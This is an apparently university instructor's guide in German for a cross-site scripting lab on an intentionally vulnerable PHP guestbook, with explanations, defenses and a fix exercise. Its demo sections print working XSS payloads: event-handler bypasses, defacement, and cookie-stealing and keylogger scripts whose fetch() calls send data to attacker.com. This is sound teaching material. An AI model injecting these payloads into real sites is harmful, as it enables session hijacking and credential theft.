# XSS Gästebuch - Leitfaden für Lehrende

## Übersicht

Diese Anleitung führt Sie durch die XSS-Übung mit dem Gästebuch und bietet didaktische Hinweise zur Vermittlung des Themas Cross-Site Scripting (XSS).

**Zielgruppe**: Studierende mit Grundkenntnissen in Webentwicklung (HTML, JavaScript, PHP)
**Dauer**: 60-90 Minuten
**Voraussetzungen**: Kali Linux VM mit installiertem Gästebuch

---

## Lernziele

Nach dieser Übung sollten Studierende:

1. ✅ Die drei Haupttypen von XSS verstehen (Stored, Reflected, DOM-based)
2. ✅ Verstehen, wie unsicherer Code zu XSS-Schwachstellen führt
3. ✅ Den Unterschied zwischen verschiedenen Sanitierungsmethoden kennen
4. ✅ Reale Angriffsvektoren und deren Auswirkungen verstehen
5. ✅ Schutzmaßnahmen gegen XSS implementieren können

---

## Teil 1: Einführung in XSS (10-15 Minuten)

### Theorie

**Was ist Cross-Site Scripting (XSS)?**

XSS ist eine Sicherheitslücke, bei der Angreifer bösartigen Code (meist JavaScript) in Webanwendungen einschleusen, der dann im Browser anderer Nutzer ausgeführt wird.

**Die drei Typen:**

1. **Stored XSS (Persistent)**:
   - Bösartiger Code wird in der Datenbank gespeichert
   - Wird bei jedem Aufruf der Seite ausgeführt
   - Betrifft alle Nutzer, die die Seite aufrufen
   - **Gefährlichste Form**

2. **Reflected XSS (Non-Persistent)**:
   - Code wird über URL-Parameter eingeschleust
   - Wird sofort zurückgegeben und ausgeführt
   - Betrifft nur den Nutzer, der den speziellen Link aufruft

3. **DOM-based XSS**:
   - Manipulation erfolgt rein client-seitig im DOM
   - Server ist nicht involviert
   - Schwer zu erkennen

**In dieser Übung fokussieren wir uns auf Stored XSS**, da das Gästebuch Einträge persistent speichert.

### Demonstration

Zeigen Sie ein einfaches Beispiel:

```html
<!-- Unsicherer Code -->
<div><?php echo $_GET['name']; ?></div>

<!-- URL: page.php?name=<script>alert('XSS')</script> -->
<!-- Resultat: JavaScript wird ausgeführt! -->
```

**Frage an Studierende**: "Was passiert hier und warum ist das gefährlich?"

---

## Teil 2: Das Gästebuch verstehen (10 Minuten)

### Code-Review

Öffnen Sie das Gästebuch im Browser: `http://localhost/guestbook/`

**Schritt 1: Quellcode anzeigen**

Klicken Sie auf den Button **"📄 Quellcode anzeigen"** im Gästebuch.

**Diskutieren Sie mit den Studierenden:**

```php
// Zeile 40-44: Kritische Stelle!
foreach ($entries as $e) {
    $msg = strip_tags($e->getMessage(), '<b><p><u><i>');  // ⚠️ TEILWEISE UNSICHER
    $author = $e->getAuthor();                            // ❌ UNSICHER!
    $email = htmlspecialchars($e->getEmail());            // ✓ SICHER
    $date = htmlspecialchars($e->getEntryDate());         // ✓ SICHER

    echo "<span>$author</span>";  // ❌ XSS möglich!
}
```

**Schlüsselfragen:**
- Warum ist `$author` unsicher?
- Was macht `strip_tags()` und warum reicht das nicht?
- Warum ist `htmlspecialchars()` sicher?

**Antworten:**
- `$author` wird NICHT escaped → direktes Einfügen von HTML/JavaScript möglich
- `strip_tags()` entfernt Tags, aber NICHT Event-Handler wie `onmouseover`
- `htmlspecialchars()` wandelt `<`, `>`, `&` in HTML-Entities um → kein JavaScript ausführbar

---

## Teil 3: Basic XSS Angriffe (15-20 Minuten)

### Demo 1: XSS Username (Stored XSS)

**Ziel**: Zeigen, dass unsanitierte Eingaben gefährlich sind

**Vorgehensweise:**
1. Klicken Sie auf **"XSS Username"** in den Demo-Links
2. Beobachten Sie, wie das Formular automatisch gefüllt wird
3. Klicken Sie auf **"Absenden"**
4. **Resultat**: Alert-Box erscheint → XSS erfolgreich!

**Erklärung:**
```javascript
// Eingefügter Code im Namen-Feld:
<script>alert('XSS im Namen!');</script>

// Wird direkt ins HTML eingefügt:
<span><script>alert('XSS im Namen!');</script></span>
```

**Diskussion:**
- "Warum funktioniert dieser Angriff?"
- "Wer ist betroffen?" → Alle Nutzer, die die Seite aufrufen!
- "Ist das persistent?" → Ja, bis Session gelöscht wird

**Status**: 🔴 **Erfolgreich** - Stored XSS

---

### Demo 2: XSS Message (strip_tags OK)

**Ziel**: Zeigen, dass `strip_tags()` manche Angriffe verhindert

**Vorgehensweise:**
1. Klicken Sie auf **"XSS Message (strip_tags OK)"**
2. Absenden
3. **Resultat**: Kein Alert → Angriff gescheitert!

**Erklärung:**
```javascript
// Eingefügter Code:
<script>alert('XSS');</script>

// Nach strip_tags():
alert('XSS');  // <script>-Tag entfernt!
```

**Diskussion:**
- "`strip_tags()` hat das `<script>`-Tag entfernt"
- "Aber ist das ausreichend Schutz?" → Nein! (siehe nächste Demo)

**Status**: 🟢 **Verhindert** - strip_tags() funktioniert hier

---

### Demo 3: XSS Message (strip_tags FAIL)

**Ziel**: Zeigen, dass `strip_tags()` unzureichend ist

**Vorgehensweise:**
1. Klicken Sie auf **"XSS Message (strip_tags FAIL)"**
2. Absenden
3. **Fahren Sie mit der Maus über den Text im Gästebucheintrag**
4. **Resultat**: Alert erscheint → XSS erfolgreich!

**Erklärung:**
```html
<!-- Eingefügter Code: -->
<u onmouseover="javascript:alert('XSS via Event-Handler!');">
    Fahre mit der Maus über diesen Text!
</u>

<!-- <u>-Tag ist erlaubt, bleibt erhalten -->
<!-- Event-Handler onmouseover bleibt auch erhalten! -->
```

**Diskussion:**
- "Das `<u>`-Tag ist in der Whitelist erlaubt"
- "`strip_tags()` entfernt nur Tags, NICHT Attribute!"
- "Event-Handler wie `onmouseover`, `onclick` etc. bleiben erhalten"

**Status**: 🔴 **Erfolgreich** - strip_tags() ist unzureichend!

---

### Demo 4: XSS htmlspecialchars is safe

**Ziel**: Zeigen, dass `htmlspecialchars()` der richtige Weg ist

**Vorgehensweise:**
1. Klicken Sie auf **"XSS htmlspecialchars is safe"**
2. Absenden
3. **Resultat**: Kein Alert → Angriff verhindert!

**Erklärung:**
```php
// Eingefügter Code im Email-Feld:
<script>alert('XSS');</script>

// Nach htmlspecialchars():
&lt;script&gt;alert('XSS');&lt;/script&gt;

// Im Browser angezeigt als Text, nicht ausgeführt:
<script>alert('XSS');</script>
```

**Diskussion:**
- "`htmlspecialchars()` wandelt Sonderzeichen in HTML-Entities um"
- "Der Code wird als Text angezeigt, nicht ausgeführt"
- "**Dies ist die empfohlene Methode!**"

**Status**: 🟢 **Verhindert** - htmlspecialchars() ist sicher

---

## Teil 4: Advanced XSS Angriffe (20-30 Minuten)

### Demo 5: Cookie Stealing

**Ziel**: Reale Gefahr von XSS demonstrieren

**Vorgehensweise:**
1. Klicken Sie auf **"Cookie Stealing"**
2. Absenden
3. **Resultat**: Alert zeigt aktuelle Cookies

**Erklärung:**
```javascript
// JavaScript im Namen-Feld:
<script>
    alert('Cookies: ' + document.cookie);

    // In einem echten Angriff:
    fetch('http://attacker.com/steal.php?c=' + document.cookie);
</script>
```

**Diskussion:**
- "Was steht in Cookies?" → Session-IDs, Auth-Tokens
- "Was kann ein Angreifer damit machen?" → **Session Hijacking!**
- "Wie schützt man Cookies?" → `HttpOnly` Flag (JavaScript kann nicht darauf zugreifen)

**Reales Szenario:**
1. Angreifer fügt Cookie-Stealing Code ins Gästebuch ein
2. Admin oder andere Nutzer besuchen die Seite
3. Ihre Session-Cookies werden gestohlen
4. Angreifer kann sich als diese Nutzer ausgeben

**Status**: 🔴 **Erfolgreich** - Sehr gefährlich!

---

### Demo 6: Defacement

**Ziel**: Zeigen, dass komplette Seiten überschrieben werden können

**Vorgehensweise:**
1. Klicken Sie auf **"Defacement (Seite überschreiben)"**
2. Absenden
3. **Warten Sie 2 Sekunden**
4. **Resultat**: Komplette Seite wird schwarz mit "DEFACED!" Meldung

**Erklärung:**
```javascript
<script>
setTimeout(function() {
    document.body.innerHTML = '<div>DEFACED!</div>';
}, 2000);
</script>
```

**Diskussion:**
- "Die komplette Seite wurde ersetzt"
- "Angreifer können gefälschte Inhalte, Propaganda oder Phishing-Formulare anzeigen"
- "Nutzer denken, sie sind noch auf der legitimen Seite"

**Reale Beispiele:**
- Politischer Aktivismus (Website-Defacement)
- Phishing (gefälschte Login-Formulare)
- Malware-Verteilung

**Status**: 🔴 **Erfolgreich** - Sehr sichtbarer Angriff

---

### Demo 7: Keylogger

**Ziel**: Zeigen, dass Eingaben aufgezeichnet werden können

**Vorgehensweise:**
1. Klicken Sie **"Angriffsdaten löschen"** (Session zurücksetzen)
2. Klicken Sie auf **"Keylogger"**
3. Absenden
4. **Tippen Sie 20 Zeichen in irgendeinem Feld**
5. **Resultat**: Alert zeigt aufgezeichnete Tasten

**Erklärung:**
```javascript
<script>
var keys = [];
document.addEventListener('keypress', function(e) {
    keys.push(e.key);

    // In einem echten Angriff:
    if (keys.length > 10) {
        fetch('http://attacker.com/log.php?keys=' + keys.join(''));
        keys = [];
    }
});
</script>
```

**Diskussion:**
- "Alle Tastatureingaben werden aufgezeichnet"
- "Was könnten Nutzer eintippen?" → Passwörter, Kreditkartennummern, PINs
- "Der Keylogger läuft im Hintergrund, unsichtbar für den Nutzer"

**Schutzmaßnahmen:**
- Content Security Policy (CSP)
- Input Sanitization
- HTTPS (schützt bei Übertragung, aber nicht gegen XSS!)

**Status**: 🔴 **Erfolgreich** - Extrem gefährlich für Privatsphäre

---

### Demo 8: Redirect (Phishing)

**Ziel**: Zeigen, wie XSS für Phishing genutzt wird

**Vorgehensweise:**
1. Klicken Sie auf **"Redirect (Phishing)"**
2. Absenden
3. **Bestätigen Sie den Dialog**
4. **Warten Sie 3 Sekunden**
5. **Resultat**: Sie werden zu Google umgeleitet

**Erklärung:**
```javascript
<script>
setTimeout(function() {
    // In einem echten Angriff:
    window.location.href = 'http://fake-bank-login.com';
}, 3000);
</script>
```

**Phishing-Szenario:**
1. User besucht legitime Bank-Website (z.B. bank.com/news)
2. XSS leitet nach 3 Sekunden zu fake-bank.com um
3. Gefälschte Login-Seite sieht identisch aus
4. User gibt Credentials ein → Angreifer hat sie

**Diskussion:**
- "User merken den Redirect oft nicht"
- "Die URL sieht legitim aus (könnte sogar ähnlich sein: bank-secure.com)"
- "Kombination mit Social Engineering sehr effektiv"

**Status**: 🔴 **Erfolgreich** - Klassischer Phishing-Vektor

---

## Teil 5: Schutzmaßnahmen (15-20 Minuten)

### 1. Output Encoding (Wichtigste Maßnahme!)

**Immer `htmlspecialchars()` verwenden:**

```php
// ❌ UNSICHER
echo "<div>" . $userInput . "</div>";

// ✓ SICHER
echo "<div>" . htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') . "</div>";
```

**Parameter:**
- `ENT_QUOTES`: Escaped auch einfache und doppelte Anführungszeichen
- `'UTF-8'`: Wichtig für korrekte Encoding

### 2. Input Validation

**Validieren Sie Eingaben:**

```php
// Email validieren
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Ungültige Email");
}

// Nur bestimmte Zeichen erlauben
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $name)) {
    die("Name enthält ungültige Zeichen");
}
```

**Aber Achtung**: Validation alleine reicht NICHT! Immer auch Output Encoding!

### 3. Content Security Policy (CSP)

**HTTP Header setzen:**

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**Verhindert:**
- Inline-JavaScript (`<script>alert(1)</script>`)
- External Scripts von fremden Domains
- Event-Handler (`onmouseover=...`)

**Vorteil**: Defense-in-Depth - auch wenn XSS durchkommt, wird es nicht ausgeführt

### 4. HttpOnly und Secure Cookies

```php
setcookie(
    'session',
    $sessionId,
    [
        'httponly' => true,  // JavaScript kann nicht darauf zugreifen
        'secure' => true,    // Nur über HTTPS
        'samesite' => 'Strict'  // CSRF-Schutz
    ]
);
```

### 5. Framework-Features nutzen

**Moderne Frameworks haben eingebauten XSS-Schutz:**

- **React**: Escaped standardmäßig
- **Vue.js**: `{{ }}` escaped automatisch
- **Angular**: Sanitization eingebaut
- **Laravel/Symfony**: Blade/Twig escapen automatisch

**Aber**: Bei `dangerouslySetInnerHTML` (React) oder `v-html` (Vue) muss man aufpassen!

---

## Teil 6: Hands-On Übung (15-20 Minuten)

### Aufgabe für Studierende

**"Fixen Sie das Gästebuch!"**

1. Öffnen Sie `/var/www/html/guestbook/index.php`
2. Finden Sie die unsichere Zeile (ca. Zeile 42)
3. Fixen Sie den Code, sodass XSS im Namen-Feld nicht mehr funktioniert

**Lösung:**

```php
// Vorher (UNSICHER):
$author = $e->getAuthor();

// Nachher (SICHER):
$author = htmlspecialchars($e->getAuthor(), ENT_QUOTES, 'UTF-8');
```

**Testen:**
1. Speichern Sie die Datei
2. Klicken Sie "Angriffsdaten löschen"
3. Probieren Sie "XSS Username" erneut
4. **Resultat**: Kein Alert mehr → Erfolg! ✓

### Bonus-Aufgaben

**Fortgeschrittene Studierende:**

1. Implementieren Sie CSP-Header
2. Setzen Sie HttpOnly-Cookies
3. Entfernen Sie die `strip_tags()` Whitelist und nutzen Sie nur `htmlspecialchars()`
4. Fügen Sie Input-Validation für den Namen hinzu (nur Buchstaben und Zahlen)

---

## Teil 7: Zusammenfassung und Diskussion (10 Minuten)

### Key Takeaways

1. **XSS ist eine der häufigsten Schwachstellen** (OWASP Top 10)
2. **Stored XSS ist am gefährlichsten** (betrifft alle Nutzer)
3. **`htmlspecialchars()` ist die Lösung**, nicht `strip_tags()`
4. **XSS ermöglicht viele Angriffe**: Cookie-Stealing, Defacement, Keylogging, Phishing
5. **Defense-in-Depth**: Mehrere Schutzschichten (Output Encoding + CSP + HttpOnly Cookies)

### OWASP Top 10 Kontext

XSS war lange Zeit #3 in den OWASP Top 10.
Ab 2021 wurde es in **A03:2021 – Injection** integriert.

**Verwandte Angriffe:**
- SQL Injection (A03)
- Command Injection (A03)
- LDAP Injection (A03)

**Alle haben dieselbe Ursache**: Unsanitierte Nutzereingaben!

### Fragen zur Diskussion

1. "Warum reicht HTTPS alleine nicht gegen XSS?"
2. "Kann ein Antivirus XSS-Angriffe verhindern?"
3. "Warum sollte man niemals Nutzereingaben vertrauen?"
4. "Welche anderen Angriffe werden durch XSS ermöglicht?" (CSRF, Clickjacking, etc.)

---

## Zusatzmaterial

### Weiterführende Ressourcen

- [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Google XSS Game](https://xss-game.appspot.com/)

### Live-Hacking Demos (Optional)

Wenn Sie mehr Zeit haben:

1. **XSS Game von Google**: https://xss-game.appspot.com/
2. **DVWA (Damn Vulnerable Web App)**: Weitere XSS-Übungen
3. **HackTheBox**: XSS-Challenges

### Hausaufgabe

**Recherchieren Sie einen realen XSS-Angriff:**
- Welche Website war betroffen?
- Wie wurde der Angriff durchgeführt?
- Welche Auswirkungen hatte er?
- Wie wurde er behoben?

**Bekannte Beispiele:**
- Twitter XSS Worm (2010) - Mikko's Tweet
- British Airways (2018) - 380.000 Kreditkarten gestohlen
- eBay XSS (2014)
- MySpace Samy Worm (2005) - 1 Million Freundschaftsanfragen in 20 Stunden

---

## Troubleshooting

### Problem: Angriffe funktionieren nicht

**Lösung:**
- Klicken Sie auf "Angriffsdaten löschen"
- Stellen Sie sicher, dass Apache läuft: `sudo systemctl status apache2`
- Leeren Sie den Browser-Cache (Strg+Shift+R)

### Problem: Seite ist nach Defacement "kaputt"

**Lösung:**
- Klicken Sie auf "Angriffsdaten löschen"
- Oder laden Sie die Seite neu (F5)
- Session-Daten werden gelöscht, Standard-Einträge kommen zurück

### Problem: Modal (Quellcode) öffnet nicht

**Lösung:**
- Prüfen Sie Browser-Konsole (F12) auf JavaScript-Fehler
- Stellen Sie sicher, dass guestbook.css geladen wird
- Testen Sie mit anderem Browser

---

## Didaktische Hinweise

### Timing

- **Nicht hetzen** bei den Demos - lassen Sie Studierende die Auswirkungen sehen
- **Pausen einbauen** für Fragen
- **Hands-On Teil ist wichtig** - Studierende müssen selbst coden

### Interaktion

- **Stellen Sie Fragen** statt nur zu präsentieren
- **Lassen Sie Studierende raten** was passieren wird
- **Diskutieren Sie reale Fälle** - macht es greifbarer

### Schwierigkeitsgrad

- **Basic Demos zuerst** (Alert-Boxen)
- **Dann Advanced** (Cookie-Stealing, Keylogger)
- **Nicht alle Demos zeigen** wenn Zeit knapp ist - fokussieren Sie sich auf die wichtigsten

### Häufige Missverständnisse

1. **"HTTPS schützt gegen XSS"** → Nein! HTTPS schützt nur die Übertragung
2. **"Antivirus erkennt XSS"** → Nein! Es ist kein Virus, sondern eine Schwachstelle
3. **"Input Validation reicht"** → Nein! Immer auch Output Encoding!
4. **"strip_tags() ist sicher"** → Nein! Event-Handler bleiben erhalten

---

## Lizenz und Credits

**Erstellt für**: GISH (Grundlagen der IT-Sicherheit) Vorlesung
**Autor**: Claude Code
**Lizenz**: Educational Use

Bei Fragen oder Verbesserungsvorschlägen: GitHub Issues im Repository erstellen.

---

**Viel Erfolg beim Unterrichten! 🎓**
